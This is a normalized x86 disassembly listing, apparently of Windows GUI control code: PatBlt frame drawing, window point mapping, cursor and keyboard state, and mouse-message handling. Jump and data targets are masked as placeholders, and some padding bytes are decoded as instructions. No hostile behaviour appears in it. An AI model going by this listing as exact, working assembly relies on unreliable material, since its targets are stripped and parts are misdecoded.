call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44f4a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_425300
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f4aa
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_44f4dc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_44e3f8
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034cc
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403518
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403518
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403518
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403518
jmp r-xdata
sub_44f5cc
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_417644
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_44fab4
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_44e844
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_44e858
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_417694
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44f7ac
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_44e3cc
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403518
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_4550b4
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44bfc8
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_44f797
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_4550b4
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_4550b4
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403518
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40331c
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44e254
test esi esi
je r-xdata
sub_44f7ac
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403518
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_450630
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403518
mov eax esi
call sub_44e2fc
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_44e2b8
mov ecx eax
xor edx edx
xor eax eax
call sub_41766c
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403518
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_44f850
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_44f880
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_44f8ec
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_44f9ac
sub_44f91c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_44f94c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_44e3f8
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44f978
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_44f9ac
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_44fa80
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_44fab4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_44fb4c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_4657c8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_4657c8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_44e454
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_46ef74
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403518
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_46570c
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403518
jmp r-xdata
sub_44fce0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408dc4
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408df0
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_44e454
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_408c08
call sub_408ba4
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408ba4
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_44fd88
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_44fdb8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_44fd7c
push ebp
call sub_44fd88
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44fe08
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_44fe94
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_44fecc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_44f94c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_46567c
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403518
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_46567c
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403518
sub_44ff50
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_44e424
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_44eaec
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_44fecc
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_44ff9c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_44e424
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_44ffb8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_44e424
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_44eaec
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44fecc
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403518
sub_450010
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_44f8ec
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_44f880
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_44f8ec
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_4500ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44fecc
pop esi
pop ebx
retn
sub_4500d1
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44fecc
pop esi
pop ebx
retn
sub_4500f7
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44fecc
pop esi
pop ebx
retn
sub_450121
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44fecc
pop esi
pop ebx
retn
sub_450147
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_45017c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_44f94c
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_46567c
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403518
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_46567c
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403518
sub_4501f4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_45022c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_46567c
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403518
sub_450264
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_44eaec
mov edx edi
xor ecx ecx
mov eax ebx
call sub_45022c
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406e50
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403518
sub_4502dc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_45022c
pop esi
pop ebx
retn
sub_4502fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_45022c
pop esi
pop ebx
retn
sub_45031c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_46567c
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403518
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_459a70
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_450374
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44eadc
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_44eaec
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_44fa80
pop esi
retn
sub_4503b4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
